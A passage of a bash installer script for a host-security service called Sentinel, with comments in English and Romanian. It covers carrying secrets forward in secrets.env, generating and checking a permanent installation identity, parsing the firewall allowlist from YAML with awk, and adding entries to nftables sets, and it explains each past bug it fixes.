# Keys the DEPLOY CHANNEL may set. This is not a list of what the file may
# contain — everything already in the file is carried forward regardless, see
# step_secrets. It is a list of what a value arriving on stdin is allowed to
# name.
#
# THIS IS NOT A PRIVILEGE BOUNDARY, and an earlier version of this comment
# claimed it was: it said secrets.env is an EnvironmentFile for units that run
# as root, so an invented name could set a root process's environment. That is
# false. No unit references this file at all — sentinel/config.py:load_secrets
# reads it directly, looks up a fixed set of names, and nothing else is ever
# consulted. An unknown name in the file is inert. Written down because a
# security reason nobody can check is a constraint the next person preserves
# without knowing why.
#
# The real reason is duller and still good: a name this installer does not know
# is far more likely a typo in secrets/.env.local (SENTINEL_DB_PASWORD=) than a
# new secret. Writing it would leave the operator with a rotation that looked
# like it worked while the real key kept its old value. So stdin may set a name
# this installer knows or one this host already has — and a name it invents is
# refused out loud, with the fix: put it on the host once, and every later run
# carries it.
#
# SENTINEL_BEACON_SECRET and SENTINEL_SHIP_SECRET joined the list on 19 August
# 2026. Both are HALF OF A PAIR held by a party outside this host — the external
# witness and the aggregator — so neither may ever be generated here, and both
# must be settable on a host that has never had one. Until now the only way to
# place either was to write it into secrets.env by hand and let a later run
# carry it forward, which meant the documented path for a shipped feature began
# with an undocumented manual step performed as root.
#
# The beacon key is the proof that the gap has teeth, and the comment above
# records it: its absence from these lists is what turned `--force-step 22,27`
# into a rotation that destroyed the only copy of a key nothing could restore.
# Carrying keys forward fixed the destruction. It did not give either key a way
# in, and a key with no way in is a key that gets placed by hand, once, by
# whoever remembers.
#
# TELEGRAM_OWNER_USER_ID joined the list on 25 September 2026, for the same
# structural reason, not a new one: step 42 (telegram_owner) needs it to
# narrow `telegram.allowed_user_ids` on a live sentinel.yaml, exactly the way
# step 22/27 need SENTINEL_DB_PASSWORD and TELEGRAM_BOT_TOKEN. Left off this
# list, `read_stdin_secrets` would still read it off stdin into SECRETS, and
# step_secrets would still silently drop it — the "will be added" line further
# down would be lying to the operator about a key that never lands anywhere,
# not just a lost rotation.
OPERATOR_SECRET_KEYS=(ANTHROPIC_API_KEY TELEGRAM_BOT_TOKEN TELEGRAM_CHAT_ID
                      TELEGRAM_OWNER_USER_ID
                      SENTINEL_DB_PASSWORD TELEGRAM_APPLY_PIN
                      SENTINEL_BEACON_SECRET SENTINEL_SHIP_SECRET)

# Read a key out of the secrets file already on disk, if there is one.
#
# Leading whitespace is allowed for the same reason step_secrets allows it when
# it decides which keys exist: the two must agree. If the scan accepts an
# indented `  KEY=value` and this does not, the key is kept in the new file with
# its value silently emptied — a deletion wearing the shape of a preservation.
existing_secret() {
    local target="${SENTINEL_CONFIG_DIR}/secrets.env" key="$1"
    [[ -r "$target" ]] || return 1
    local line
    line="$(grep -m1 "^[[:space:]]*${key}=" "$target" 2>/dev/null)" || return 1
    printf '%s' "${line#*=}"
}

# The other half of every "stdin first, then existing_secret" read: a lookup
# into SECRETS that stays correct no matter what state the array is in —
# declared with the key, declared without it, or not declared at all.
#
# A bare `${SECRETS[$key]:-}` cannot make that last guarantee: bash forgets
# the `-A` (associative) attribute the instant the variable is unset, so once
# that happens the SAME expression is reparsed as an INDEXED-array reference
# and the subscript becomes an ARITHMETIC expression — a bare key name like
# TELEGRAM_OWNER_USER_ID is then read as a shell variable, and under `set -u`
# an undefined one is "unbound variable", not the empty default `:-` was
# meant to supply. See the comment on `SECRETS=()` at the end of step 27 for
# the incident this reproduces and why that step no longer unsets it — this
# accessor exists anyway, so a step reading a secret never again depends on
# remembering that.
secrets_get() {
    local key="$1"
    [[ "$(declare -p SECRETS 2>/dev/null)" == "declare -A"* ]] || return 0
    printf '%s' "${SECRETS[$key]:-}"
}

# Identitatea instalării: o valoare aleatoare, generată o dată și niciodată din
# nou. Aceleași reguli ca la GENERATED_SECRET_KEYS de mai sus, din același
# motiv: valoarea supraviețuiește instalării și altcineva o ține minte.
#
# De ce nu hostname: se schimbă (redenumire, migrare, un panou care recreează
# VPS-ul), iar o identitate schimbată bifurcă istoria unui server în două pe un
# agregator care adună mai multe. E și recunoaștere gratuită acolo — spune cui
# se uită cum se cheamă mașinile operatorului.
#
# De ce nu /etc/machine-id: o mașină clonată îl moștenește. Două servere cu
# aceeași identitate e exact eșecul pe care valoarea aleatoare îl evită, și e
# singurul care nu produce niciun raport de defecțiune nicăieri: agregatorul
# contopește două istorii într-una și cifrele doar încetează să însemne ce spun.
#
# Deci: un fișier existent se duce mai departe NEATINS, iar unul cu conținut
# nerecunoscut nu se rescrie — se semnalează. Poate fi singura copie a unei
# valori pe care agregatorul o cunoaște deja.
# Citește fișierul de identitate ÎNTR-O VARIABILĂ, sau refuză să pretindă că
# poate. Valoarea ajunge în INSTANCE_ID_READ; codul de ieșire spune de ce nu:
#
#   0  s-a citit; INSTANCE_ID_READ e conținutul fără spațiul de la capete
#   1  fișierul nu există
#   2  fișierul EXISTĂ dar nu poate fi reprezentat aici (conține NUL)
#   3  nu s-a putut măsura fișierul — nu se știe nimic despre el
#
# Motivul pentru care e o funcție și nu două linii repetate: o variabilă de
# shell NU poate conține octetul NUL. `$(cat fișier)` îl aruncă tăcut (bash
# scrie „ignored null byte in input" pe stderr și continuă cu restul), deci un
# fișier care conține „<32 de hexa><NUL>" ajungea aici drept identitate perfect
# validă — în timp ce `Path.read_text()` din sentinel/identity.py îl păstrează
# și refuză valoarea de 33 de caractere.
#
# Nu e o coliziune teoretică: e chiar forma pe care o ia coruperea de care
# vorbește comentariul de la re-citire. Un ext4/xfs care pierde curentul la
# mijlocul unei scrieri completează blocul cu NUL, nu trunchiază fișierul. Deci
# garda pusă anume pentru scrierea parțială era oarbă exact la varianta ei cea
# mai probabilă, iar rezultatul era: instalare verde, iar peste ore
# „⚪ Nu pot citi identitatea instalării" despre fișierul pe care instalatorul
# tocmai îl garantase.
#
# Se compară numărul de octeți cu și fără NUL ÎNAINTE de orice citire în
# variabilă. Egale = fișierul poate fi reprezentat aici; diferite = nu poate, și
# atunci singurul răspuns onest e că nu e o identitate.
#
# LIMITĂ CUNOSCUTĂ, lăsată dinadins: fișierul e măsurat de două ori și citit a
# treia oară, deci un NUL apărut între măsurare și citire ar trece. Nimic
# altceva nu scrie /etc/sentinel/instance_id — pasul ăsta e singurul scriitor,
# iar fișierul e 0640 root:sentinel — deci fereastra nu e accesibilă în
# practică. Închiderea ei înseamnă citirea octeților O SINGURĂ dată, printr-o
# codare care îi poate purta pe toți (`od`, `base64`), nu măsurare-apoi-citire.
# Scrisă aici fiindcă o limită nedocumentată e cea care se descoperă târziu.
INSTANCE_ID_READ=""

read_instance_id_file() {
    local path="$1" total nulless value
    INSTANCE_ID_READ=""
    [[ -f "$path" ]] || return 1

    total="$(wc -c < "$path" 2>/dev/null | tr -d '[:space:]' || true)"
    nulless="$(LC_ALL=C tr -d '\000' < "$path" 2>/dev/null | wc -c | tr -d '[:space:]' || true)"
    [[ -n "$total" && -n "$nulless" ]] || return 3
    [[ "$total" == "$nulless" ]] || return 2

    # Se taie DOAR spațiul de la capete, exact cele șase caractere pe care le
    # taie și `str.strip(" \t\n\r\v\f")` din sentinel/identity.py, celălalt
    # cititor al aceluiași fișier. Un `tr -d '[:space:]'` ar fi scos și spațiul
    # dinăuntru, deci un fișier editat de mână în „0123 4567…" ar fi trecut aici
    # drept valid și ar fi fost refuzat acolo — instalare verde, autoverificare
    # roșie, despre același fișier.
    value="$(cat "$path" 2>/dev/null || true)"
    value="${value#"${value%%[![:space:]]*}"}"
    value="${value%"${value##*[![:space:]]}"}"
    INSTANCE_ID_READ="$value"
    return 0
}

ensure_instance_id() {
    local target="${SENTINEL_CONFIG_DIR}/instance_id" current="" written="" rc=0

    rc=0; read_instance_id_file "$target" || rc=$?
    current="$INSTANCE_ID_READ"

    if (( rc == 3 )); then
        # Nici „are identitate", nici „nu are". A genera peste un fișier despre
        # care nu se știe nimic e singurul lucru ireversibil de aici.
        die "nu pot măsura ${target}; refuz să decid dacă gazda are deja identitate"
    fi

    if (( rc == 2 )); then
        warn "${target} conține octeți NUL, deci nu e o identitate — și nu poate fi"
        warn "citit corect nici măcar de shell. Așa arată o scriere întreruptă: un"
        warn "sistem de fișiere completează blocul cu NUL, nu taie fișierul."
        warn "NU a fost rescris. Uită-te în el:  od -c ${target}"
        warn "Dacă nu e o identitate, șterge-l și re-rulează pasul:"
        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
        return 0
    fi

    if [[ -n "$current" ]]; then
        if [[ ! "$current" =~ ^[0-9a-f]{32}$ ]]; then
            warn "${target} există dar nu conține o identitate validă (se așteaptă 32"
            warn "de caractere hexa minuscule). NU a fost rescris, dinadins: dacă"
            warn "valoarea veche a ajuns vreodată la un agregator, suprascrierea ar"
            warn "rupe istoria acestui server în două. Uită-te în el; dacă nu e o"
            warn "identitate, șterge-l și re-rulează pasul:"
            warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
            # `return`, nu `current=""`: căderea în ramura de mai jos ar fi
            # tipărit linia verde „identitatea instalării păstrată" peste un
            # fișier despre care tocmai s-a spus că nu e o identitate.
            return 0
        fi
        # Modul și proprietarul se reafirmă și pe un fișier păstrat. Procesele
        # rulează ca ${SENTINEL_USER} și citesc prin GRUP; un fișier rămas
        # 0600 root:root după o restaurare din backup face identitatea
        # necitibilă, iar simptomul nu apare aici, ci peste ore, ca o
        # autoverificare „nu pot citi identitatea".
        chown "root:${SENTINEL_USER}" "$target"
        chmod 0640 "$target"
        ok "identitatea instalării păstrată (${current:0:8}…) — nu se regenerează niciodată"
        return 0
    fi

    [[ -f "$target" ]] && warn "${target} era gol — nu e nimic de păstrat, se generează"

    have openssl || die "openssl lipsește; nu pot genera identitatea instalării"

    # Modul corect ÎNAINTE de conținut, ca la secrets.env: a scrie întâi și a da
    # chmod după lasă o fereastră în care fișierul e lizibil de oricine.
    ( umask 077; : > "${target}.tmp" )
    chown "root:${SENTINEL_USER}" "${target}.tmp"
    chmod 0640 "${target}.tmp"
    openssl rand -hex 16 > "${target}.tmp" || die "openssl rand a eșuat"
    mv "${target}.tmp" "$target"

    # Ce dovedește că a mers: valoarea RECITITĂ de pe disc are forma cerută.
    # Codul de ieșire al lui openssl nu spune nimic despre ce a ajuns în fișier
    # — redirectarea e a shell-ului, nu a lui, iar un disc plin sau o cotă atinsă
    # lasă în urmă un fișier gol sau trunchiat. O identitate trunchiată se
    # coliziona cu alta la fel de trunchiată, și nimic n-ar fi spus-o.
    #
    # Prin `read_instance_id_file`, nu printr-un `$(cat …)` direct, din același
    # motiv pentru care există funcția: substituția de comandă aruncă NUL, deci
    # o scriere parțială completată cu NUL — forma cea mai probabilă a exact
    # eșecului descris mai sus — ar fi trecut de propria ei gardă.
    # CONSECINȚĂ CUNOSCUTĂ: fișierul stricat rămâne pe disc, iar fiecare rulare
    # de după el îl refuză, deci gazda nu capătă identitate până nu-l șterge un
    # om — chiar dacă valoarea fusese bătută cu o secundă înainte și n-a văzut-o
    # niciun agregator. Acceptată dinadins: pasul nu are memoria fișierului pe
    # care tocmai l-a scris, deci nu poate deosebi „e al meu, de acum" de „era
    # aici dinainte", iar a doua e valoarea pe care nu are voie s-o distrugă.
    # Mesajele de mai jos spun exact ce e de făcut.
    rc=0; read_instance_id_file "$target" || rc=$?
    written="$INSTANCE_ID_READ"
    (( rc == 0 )) \
        || die "identitatea scrisă în ${target} nu se poate reciti (cod ${rc})"
    [[ "$written" =~ ^[0-9a-f]{32}$ ]] \
        || die "identitatea scrisă în ${target} nu se recitește ca 32 de caractere hexa"

    ok "identitate de instalare generată: ${written:0:8}… (${target}, 0640 root:${SENTINEL_USER})"
}

step_secrets() {
    local target="${SENTINEL_CONFIG_DIR}/secrets.env"

    # Create with the right mode BEFORE any content exists. Writing first and
    # chmod'ing after leaves a window in which the file is world-readable.
    ( umask 077; : > "${target}.tmp" )
    chown "root:${SENTINEL_USER}" "${target}.tmp"
    chmod 0640 "${target}.tmp"

    # EVERY key already in the file is carried over, whatever its name.
    #
    # This step used to rebuild the file from two hard-coded lists and nothing
    # else, so a re-run deleted every key outside them. SENTINEL_BEACON_SECRET
    # was added to this host after those lists were written, which made the
    # documented password rotation (--force-step 22,27) destroy the only copy of
    # it: it is not in secrets/.env.local, so stdin cannot restore it, and it
    # must never be regenerated because the external watcher holds the same
    # value and the pair is the whole point.
    #
    # It would also have failed in silence at both ends. This step prints a
    # green line about the keys it DID keep, and sentinel-beacon exits 0 when
    # the secret is missing (deliberately — see the unit), so `systemctl
    # restart` returns 0 over a unit that is now dead and step 36 reports
    # "enabled and restarted".
    #
    # A hard-coded list of keys-to-preserve ages exactly like a hard-coded list
    # of steps: quietly, at the next key added, and the symptom arrives months
    # later during an unrelated rotation.
    local key value line stripped kept=0 made=0 lineno=0
    local -a ordered=() carried=() unparsed=() on_disk=()

    for key in "${OPERATOR_SECRET_KEYS[@]}" "${GENERATED_SECRET_KEYS[@]}"; do
        ordered+=("$key")
    done

    if [[ -r "$target" ]]; then
        while IFS= read -r line || [[ -n "$line" ]]; do
            lineno=$((lineno + 1))
            # Leading whitespace off before deciding what the line is: an
            # indented comment is a comment, and an indented KEY=value is a key
            # — that is how sentinel/config.py reads this file, so treating
            # either as garbage would report a loss that had not happened, or
            # cause one that had not been asked for.
            stripped="${line#"${line%%[![:space:]]*}"}"
            [[ -z "$stripped" || "$stripped" == \#* ]] && continue
            if [[ ! "$stripped" =~ ^([A-Za-z_][A-Za-z0-9_]*)= ]]; then
                # Never the content: this file is nothing but secrets. The line
                # number is enough to find it, and cannot leak a value.
                unparsed+=("$lineno")
                continue
            fi
            key="${BASH_REMATCH[1]}"
            on_disk+=("$key")
            in_list "$key" "${ordered[@]}" || { ordered+=("$key"); carried+=("$key"); }
        done < "$target"
    fi

    {
        echo "# Generated by install.sh at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
        echo "# Mode 0640 root:sentinel. Never commit, never copy, never echo."

        for key in "${ordered[@]}"; do
            # Precedence: what was just handed to us wins, then whatever is
            # already on disk. An upgrade run that supplies no secrets must not
            # erase the ones that are working.
            value="${SECRETS[$key]:-}"
            [[ -z "$value" ]] && value="$(existing_secret "$key" || true)"

            # Host-generated keys, and only those, may be created from nothing.
            if in_list "$key" "${GENERATED_SECRET_KEYS[@]}"; then
                if [[ -n "$value" ]]; then
                    kept=$((kept + 1))
                else
                    value="$(openssl rand -hex 32)"
                    made=$((made + 1))
                fi
            fi

            # An empty value is still written IF the key was in the old file.
            # Reporting a key as carried over and then dropping it because its
            # value happened to be empty is intent reported as effect — the
            # exact shape this whole change exists to remove — and it would also
            # make the key-name diff in OPERARE.md §11 (a) show a loss.
            if [[ -n "$value" ]] || in_list "$key" ${on_disk[@]+"${on_disk[@]}"}; then
                printf '%s=%s\n' "$key" "$value"
            fi
        done
    } >> "${target}.tmp"

    mv "${target}.tmp" "$target"
    ok "secrets written to ${target} (0640 root:${SENTINEL_USER})"
    (( kept )) && ok "kept ${kept} existing key(s) — TOTP enrolments stay valid"
    if (( ${#carried[@]} )); then
        ok "carried over ${#carried[@]} key(s) this installer does not manage: ${carried[*]}"
    fi
    if (( ${#unparsed[@]} )); then
        warn "${#unparsed[@]} line(s) in the previous ${target} were neither a comment"
        warn "nor KEY=value and were NOT carried over — line(s): ${unparsed[*]}"
        warn "The old file is gone; recover them from a backup if they mattered."
    fi
    if (( made )); then
        warn "generated ${made} new key(s). If this host had TOTP enrolments"
        warn "from an older secret, they must be re-enrolled:"
        warn "    sudo sentinel web --enroll-totp --username <user>"
    fi

    # A value supplied on stdin under a name this host has never had is dropped
    # — see OPERATOR_SECRET_KEYS for why — but never in silence: the operator
    # put it there on purpose and would otherwise be left believing it landed.
    if (( ${#SECRETS[@]} )); then
        for key in "${!SECRETS[@]}"; do
            in_list "$key" "${ordered[@]}" && continue
            # The name is only safe to print once it looks like a name. The
            # stdin reader already refuses anything else, and this is the second
            # lock on the same door: a caller that populates SECRETS some other
            # way must not be able to turn a wrapped secret into a log line.
            if [[ ! "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]]; then
                warn "a value supplied on stdin carries a name that is not an \
environment variable name; it was NOT saved. The name is withheld on purpose — on a \
malformed line it is secret material, not a name."
                continue
            fi
            warn "${key} was supplied on stdin but this installer does not write it \
and this host does not already have it. It was NOT saved. If it belongs here, add it \
to ${target} on the host first; a later run will then carry it over."
        done
    fi

    # Cleared, not unset. The values themselves must not linger for the rest
    # of what can be a long-running process — that is the real reason this
    # line exists — but `unset SECRETS` throws away the `-A` (associative)
    # attribute along with the values, and bash does not remember it was ever
    # there: a later `${SECRETS[$key]}` is then parsed as an INDEXED-array
    # reference, whose subscript is evaluated as an ARITHMETIC expression, so
    # a bare key name like TELEGRAM_OWNER_USER_ID is read as a shell
    # variable — and under `set -u` (deploy/lib/common.sh) an undefined one is
    # "unbound variable", not the empty string the trailing `:-` was meant to
    # supply. That is exactly what step 42 hit on the production deploy of 28
    # September 2026: `TELEGRAM_OWNER_USER_ID: unbound variable`, the KEY
    # named in the error rather than the array, which is the tell.
    #
    # `SECRETS=()` empties the array (same effect: no value survives this
    # step) while leaving the variable declared exactly as line ~249 left it,
    # so every later `${SECRETS[...]}` keeps parsing as the associative
    # lookup it was written as. Confirmed directly:
    #   set -u; declare -A SECRETS=([A]=1); unset SECRETS
    #   echo "${SECRETS[SOME_KEY]:-}"   # -> SOME_KEY: unbound variable
    #   set -u; declare -A SECRETS=([A]=1); SECRETS=()
    #   echo "${SECRETS[SOME_KEY]:-}"   # -> empty, as intended
    SECRETS=()
}

# --- 28 -------------------------------------------------------------------
step_migrate() {
    "${SENTINEL_PREFIX}/bin/sentinel" migrate || die "database migrations failed"
    ok "schema up to date"
}

# --- 29 -------------------------------------------------------------------
# Prints the entries of `response.extra_allowlist`, one per line, from a
# sentinel.yaml. Exit status 3 means "the key is there and I could not read it";
# any other non-zero status means awk itself failed.
#
# BOTH YAML forms, because both of them are on disk. This installer WRITES the
# flow form — `extra_allowlist: [@@EXTRA_ALLOWLIST@@]` in
# deploy/config/sentinel.yaml.tmpl — while the comment above that key invites
# the operator to add block-form entries by hand. The reader here understood
# only the block form, so on every host this installer has ever configured the
# loop below ran ZERO times: the admin address seeded into the list at step 26
# and every address added afterwards reached nftables not at all, and the step
# still printed a green line with a count that never included them.
#
# awk and nothing else. This step runs before the venv exists, so there is no
# python and no yq to fall back on, and adding a dependency to read six lines of
# configuration would be a new way for the install to fail. That also means this
# is a reader for the two shapes this one key is written in, not a YAML parser —
# which is why every entry it produces is still passed through
# allowlist_element, and why anything it cannot read comes out as nothing rather
# than as a guess.
#
# executor/sentinel_executor.py has to read the same key out of the same file
# and get the same answers, and tests/unit/test_allowlist_v6.py runs the two
# readers over one fixture table. The shapes below are the contract between
# them; changing one side alone is how the executor and the firewall end up
# disagreeing about who is allowlisted.
extra_allowlist_entries() {
    local yaml="${1:-}"
    [[ -n "$yaml" && -f "$yaml" ]] || return 0
    # No `2>/dev/null` and no `|| true` on the awk below.
    #
    # A broken awk program prints its complaint and then matches nothing, which
    # on stdout is indistinguishable from an empty list — and a reader that
    # silently matched nothing is precisely the defect being repaired here, so
    # hiding its successor would be absurd. `set -e` does not need the `|| true`
    # either: the one caller takes this through a command substitution and
    # inspects the status itself, which is how status 3 reaches the operator.
    awk '
        BEGIN { Q = "\047"; f = 0; in_response = 0; unread = 0 }

        # ONE place where a value is unwrapped, so the flow form, the block form
        # and the executor cannot drift into three ideas of what a quote is.
        #
        # The order is the opposite of the obvious one: the quotes are resolved
        # FIRST and a comment only afterwards, on what is left outside them.
        # Stripping the comment first turned
        #     - "203.0.113.5 # not a comment"
        # into the unbalanced `"203.0.113.5`, which was then passed on as an
        # address. A closing quote that is missing is NOT invented: the value
        # goes on whole, so allowlist_element names it, rather than being
        # trimmed into something that reads like an address.
        function emit(s,   c, j) {
            sub(/^[ \t]+/, "", s); sub(/[ \t]+$/, "", s)
            c = substr(s, 1, 1)
            if (c == "\"" || c == Q) {
                j = index(substr(s, 2), c)
                if (j > 0) s = substr(s, 2, j - 1)
            } else {
                sub(/#.*$/, "", s)
                sub(/[ \t]+$/, "", s)
            }
            # An empty slot — "[]", or the gap left by a trailing comma — is not
            # an entry. Passed on it would become a warn about a value the
            # operator never wrote, on every single install.
            if (s != "") print s
        }

        # Position of the first ] that is NOT inside quotes, or 0. Quote-aware
        # because an entry may contain one, and because the comment that may
        # close this line lives after it: ["203.0.113.5"]  # nota.
        function flow_close(s,   i, ch, q, L) {
            q = ""; L = length(s)
            for (i = 1; i <= L; i++) {
                ch = substr(s, i, 1)
                if (q != "") { if (ch == q) q = "" }
                else if (ch == "\"" || ch == Q) q = ch
                else if (ch == "]") return i
            }
            return 0
        }

        # Split on commas that are not inside quotes. Returns the count and
        # fills out[1..n]; awk passes arrays by reference and scalars by value,
        # which is the only reason this is shaped like that.
        function flow_items(s, out,   i, ch, q, cur, n, L) {
            q = ""; cur = ""; n = 0; L = length(s)
            for (i = 1; i <= L; i++) {
                ch = substr(s, i, 1)
                if (q != "") { cur = cur ch; if (ch == q) q = "" }
                else if (ch == "\"" || ch == Q) { cur = cur ch; q = ch }
                else if (ch == ",") { n++; out[n] = cur; cur = "" }
                else cur = cur ch
            }
            n++; out[n] = cur
            return n
        }

        # ANCHORED UNDER `response:`, not merely at the start of a line.
        #
        # A line that begins in column 0 and is not a comment closes whatever
        # top-level block was open and opens another. Only inside `response:` is
        # `extra_allowlist:` the firewall allowlist. sentinel.yaml already
        # carries an unrelated `ip_allowlist` under `web:`, and the day someone
        # gives `web:` an `extra_allowlist:` of its own, a reader anchored only
        # at the start of the line would quietly turn addresses scoped to the
        # dashboard into firewall allowlist entries — the widest possible
        # reading of a setting written to be narrow.
        #
        # NO APOSTROPHES anywhere in this awk program. It is a single-quoted
        # shell word, so one in a comment closes the quote, hands the rest of
        # the program to the shell, and leaves an awk that parses and matches
        # nothing. `bash -n` accepts it; only running it shows anything.
        /^[^ \t#]/ {
            in_response = ($1 == "response:")
            f = 0
            next
        }

        in_response && /^[ \t]*extra_allowlist:/ {
            rest = $0
            sub(/^[ \t]*extra_allowlist:[ \t]*/, "", rest)
            if (substr(rest, 1, 1) == "[") {
                close_at = flow_close(substr(rest, 2))
                if (close_at > 0) {
                    n = flow_items(substr(rest, 2, close_at - 1), item)
                    for (i = 1; i <= n; i++) emit(item[i])
                } else {
                    # No unquoted "]" on this line: the flow sequence continues
                    # somewhere this reader does not follow. Nothing is emitted,
                    # because a half-read list would allowlist some entries and
                    # drop the rest without saying which — and the caller is
                    # told, through the exit status, so that "I could not read
                    # it" does not arrive looking like "it was empty".
                    unread = 1
                }
                f = 0
                next
            }
            f = 1
            next
        }

        # Inside the block form. A commented-out entry stays commented out, and
        # does not end the block either — that is how an operator parks one.
        f && /^[ \t]*#/ { next }
        f && /^[ \t]*-[ \t]/ {
            line = $0
            sub(/^[ \t]*-[ \t]*/, "", line)
            emit(line)
            next
        }
        f && NF { f = 0 }

        END { if (unread) exit 3 }
    ' "$yaml"
}

# Routes one collected entry into ALLOW_V4 or ALLOW_V6, or names it and drops it.
#
# The arrays are step_nftables' locals; bash scopes dynamically, so they are
# visible here and nowhere else in the installer. Named in capitals to say that
# this function reaches out of itself for them.
#
# The refusal is printed WITH THE VALUE. A malformed extra_allowlist entry used
# to be appended to the v4 list, rejected by the kernel and swallowed by
# `2>/dev/null`, which left the operator reading a green line about an entry
# that did not exist.
allowlist_collect() {
    local raw="$1" origin="$2" parsed element
    if ! parsed="$(allowlist_element "$raw")"; then
        warn "${origin}: '${raw}' is not an IP address or CIDR; it was NOT allowlisted"
        return 0
    fi
    element="${parsed#* }"
    # A /0 is every address there is. It stays — an operator who means it (a lab,
    # a host behind a filtering front end) is allowed to mean it, and refusing it
    # here would be a behaviour change nobody asked for — but it turns "never
    # block anything on this family" into a line that otherwise reads like any
    # other entry in the count. Said by value, once, where it can still be undone.
    if [[ "$element" == */0 ]]; then
        warn "${origin}: '${raw}' has a /0 prefix — this allowlists the ENTIRE internet on \
its family, so nothing there can ever be blocked. It was added; remove it unless you meant it."
    fi
    # De-duplicated on the way in. Step 26 seeds ADMIN_IP into
    # response.extra_allowlist, so now that that list is actually read the admin
    # address arrives here twice on every run — once from --admin-ip and once
    # from the config — and a host that answers on an address it also lists in
    # extra_allowlist repeats it a third time. A repeat is not an error, but
    # without this the second add comes back EEXIST, is counted as accepted, and
    # the "N/M accepted" line stops matching the set it is describing.
    case "${parsed%% *}" in
        v4) in_list "$element" "${ALLOW_V4[@]}" || ALLOW_V4+=("$element") ;;
        v6) in_list "$element" "${ALLOW_V6[@]}" || ALLOW_V6+=("$element") ;;
    esac
    return 0
}

# Adds elements to one allowlist set and reports what the KERNEL did with them.
#
# The old form was `nft add element … 2>/dev/null || true`, which counted every
# entry as installed whether nft had taken it or not — including the IPv6
# address it was pushing at an ipv4_addr set. A failure is still not fatal (a
# re-run re-adds elements that are already there, and that must not stop an
# install), but it is no longer silent: the element and nft's own words are
# printed. The accepted count lands in NFT_ALLOWLIST_ADDED rather than on
# stdout, so `warn` runs in this shell and the run's warning counter sees it.
#
# NFT_ALLOWLIST_ACCEPTED carries the elements the kernel actually took, in
# order, and it is the list the persisted file is written from. The step used to
# persist everything it had COLLECTED, refusals included; executor/commands.py
# reloads that file with one `nft -f`, which is one transaction, so a single
# refused line meant nothing at all came back after a reboot — including the
# admin address, which inverts "rebooting is always a way out of a self-
# inflicted block" into "rebooting removes your allowlist".
NFT_ALLOWLIST_ADDED=0
NFT_ALLOWLIST_ACCEPTED=()
nft_allowlist_add() {
    local set_name="$1"; shift
    local cidr err n=0
    NFT_ALLOWLIST_ACCEPTED=()
    for cidr in "$@"; do
        if err="$(nft add element inet sentinel "$set_name" "{ ${cidr} }" 2>&1)"; then
            n=$(( n + 1 ))
            NFT_ALLOWLIST_ACCEPTED+=("$cidr")
        elif [[ "$err" == *"File exists"* ]]; then
            # Already in the set from an earlier run: `nft -f` on the table file
            # adds to an existing table rather than replacing it, so a forced
            # re-run of this step meets its own elements. Present is present.
            #
            # "File exists" is nft's wording for EEXIST. If a future nft says it
            # differently the only cost is a warn line per element on a re-run —
            # noise, not silence, which is the direction to err in here. A type
            # mismatch (a v6 element pushed at allowlist_v4, the bug this step
            # was fixed for) is a parse error and reads nothing like it.
            #
            # Persisted as well, and that is the point of telling EEXIST apart
            # from a refusal: the element IS in the set, so it belongs in the
            # file that puts it back after a reboot.
            n=$(( n + 1 ))
            NFT_ALLOWLIST_ACCEPTED+=("$cidr")
        else
            warn "nft refused ${cidr} for ${set_name}: ${err//$'\n'/ }"
        fi
    done
    NFT_ALLOWLIST_ADDED=$n
}

step_nftables() {
    # ORDERING, AND WHAT ACTUALLY MAKES IT SAFE.
    #
    # `nft -f sentinel-table.nft` is ONE transaction and that file holds both
    # the sets and the chains, so the allowlist is NOT created before the drop
    # rules exist — an earlier version of this comment said it was, and was
    # wrong about the file it was describing.
    #
    # Two other facts do the protecting, and they are the ones to preserve. The
    # base chains are `policy accept`, so Sentinel drops only what it has been
    # explicitly told to drop; and the blocklist sets come up EMPTY, so between
    # the load and the moment the allowlist is filled there is no drop rule with
    # anything to match. Nothing is dropped until something is added to a
    # blocklist, and nothing is added to one before this step finishes.
    #
    # Inside each chain the allowlist rules do precede the blocklist rules, so
    # an address in both is accepted. That is a property of the file's contents,
    # not of the order in which things were loaded.
    #
    # RE-RUNNING THIS STEP OVER A TABLE THAT IS ALREADY THERE.
    #
    # `nft -f` does not replace a table that exists — it ADDS to it. Declaring
    # a set again is a no-op and its elements survive, which is what keeps a
    # live block and an allowlist entry in place across `--force-step 29`. But
    # declaring a CHAIN again appends every rule in the file on top of what is
    # already there. Measured on both production hosts after this step ran
    # twice over the same table: `input` carried 12 `saddr` rules where the
    # file holds 6, the second copy sitting at `counter packets 0`; `forward`
    # the same. accept/drop decisions did not change — the first matching
    # terminal rule still wins — but the non-terminating `counter` rule on the
    # watchlist counts every packet once per copy, so a hit count read back is
    # a multiple of the truth; the ruleset grows without bound on every
    # further re-run; and `nft list`, what an operator reads when checking the
    # host, stops matching this file.
    #
    # The fix is to FLUSH both chains' RULES before the reload, but only when
    # the table already exists: `flush chain` on a table that is not there
    # yet is an error, and on first install there is nothing to flush. A
    # flush empties a chain of its rules — it does not touch the sets — so
    # allowlist entries and live blocks are untouched by it; that is the
    # point, and it is why this is a flush of the two CHAINS and not a
    # `delete table`. Deleting the table would also drop every live block
    # until blocklist.py re-applies the non-expired ones from the database on
    # its own schedule, opening exactly the gap this step exists to close for
    # the allowlist. Say it once, plainly: allowlist entries stay, live blocks
    # stay, only the doubled RULES are removed.
    #
    # The flush also zeroes every rule's packet/byte counters. That is a real
    # loss — `nft list`'s own running history — but not one anything under
    # `sentinel/` desyncs from: nothing here reads a live nft counter at
    # runtime.
    #
    # The flush and the reload are ONE `nft -f` transaction — a generated temp
    # file holding `flush chain inet sentinel input`, `flush chain inet
    # sentinel forward`, then the table definition, fed to a single `nft -f`.
    # nft batches a whole `-f` file into one netlink transaction (the same
    # property the comment above already relies on for the sets-before-chains
    # ordering), so a rejected file commits nothing: the running table is left
    # exactly as it was, not half-flushed. Two separate commands would have
    # worked too — a flushed chain is `policy accept` with no rules, which
    # still drops nothing, so even an interruption between them could not lock
    # anyone out — but one transaction removes the question rather than
    # reasoning about it.
    local table_file="${SCRIPT_DIR}/nftables/sentinel-table.nft"
    if nft list table inet sentinel >/dev/null 2>&1; then
        local load_file
        load_file="$(mktemp)" || die "could not create a temp file to reload the nftables table"
        # `cat` is the last command in the group, so its exit status is the
        # group's — and it is checked explicitly rather than left to `set -e`.
        # Under errexit an unchecked failure here would abort the whole script
        # mid-function, with no [FATAL] line, no step name, and $load_file
